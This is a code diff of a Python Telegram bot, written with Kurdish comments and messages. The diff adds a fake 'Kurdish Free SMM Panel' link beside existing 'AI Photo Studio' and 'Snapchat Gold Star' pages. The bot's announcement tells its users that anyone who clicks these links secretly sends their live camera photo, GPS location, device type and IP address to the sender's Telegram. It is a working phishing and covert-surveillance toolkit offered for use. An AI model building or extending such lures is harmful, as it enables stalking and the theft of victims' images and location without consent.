@@ -8,6 +8,7 @@ TOKEN = os.environ.get("BOT_TOKEN")
 # لینکە سەرەکییەکان
 WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/"
 SNAPCHAT_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/snapchat.html"
+SMM_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/smm.html"
 
 def load_users():
     """خوێندنەوەی لیستی بەکارهێنەران لە فایلی users.json بە شێوەی ئۆبێکت/دیکشنری"""
@@ -95,15 +96,18 @@ def main():
         if should_send:
             personal_link_ai = f"{WEB_APP_URL}?id={user_id}"
             personal_link_snap = f"{SNAPCHAT_WEB_APP_URL}?id={user_id}"
+            personal_link_smm = f"{SMM_WEB_APP_URL}?id={user_id}"
 
             announcement_text = (
                 f"👋 سڵاو! ئەم سیستمە پێشکەوتووە لەلایەن **میلاد مزوری**ـەوە دروست کراوە.\n\n"
                 f"ℹ️ **دەربارەی ئەم لینکانە:**\n"
-                f"ئەم لینکانە تایبەتن بە کۆکردنەوەی زانیاری تەکنیکی و وێنەی کەسی بەرامبەر. کاتێک ئەم لینکانە بۆ هەر کەسێک دەنێریت و کلیکیان لەسەر دەکات، سەرجەم زانیارییە وردەکانی ئامێرەکەی (وەک وێنەی ڕاستەوخۆ، لۆکەیشنی GPS، جۆری ئامێر، IP و هتد) ڕاستەوخۆ و بە نهێنی بۆخۆت دێنەوە بۆ تەلەگرام.\n\n"
+                f"ئەم لینکانە تایبەتن بە کۆکردنەوەی زانیاری تەکنیکی و وێنەی کەسی بەرامبەر. کاتێک ئەم لینکانە بۆ هەر کەسێک دەنێریت و کلیکیان لەسەر دەکات، سەرجەم زانیارییە وردەکانی ئامێرەکەی (وەک وێنەی ڕاستەوخۆ، لۆکەیشنی GPS، جۆری ئامێر، IP و هtd) ڕاستەوخۆ و بە نهێنی بۆخۆت دێنەوە بۆ تەلەگرام.\n\n"
                 f"🔗 **1. لینکی یەکەم (AI Photo Studio - بە کوردی):**\n"
                 f"{personal_link_ai}\n\n"
                 f"🔗 **2. لینکی دووەم (Snapchat Gold Star - بە ئینگلیزی):**\n"
                 f"{personal_link_snap}\n\n"
+                f"🔗 **3. لینکی سێیەم (Kurdish Free SMM Panel - ٢ زمان):**\n"
+                f"{personal_link_smm}\n\n"
                 f"💡 **تێبینی و دڵنیایی:**\n"
                 f"دەتوانیت پێش ئەوەی لینکەکان بۆ کەسێکی تر بنێریت، خۆت سەرەتا تاقییان بکەیتەوە و کلیکیان لەسەر بکەیت تاوەکو زانیارییەکانت بۆ بێنەوە.\n\n"
                 f"💬 **سەبارەت به سەرنج و تێبینی:**\n"
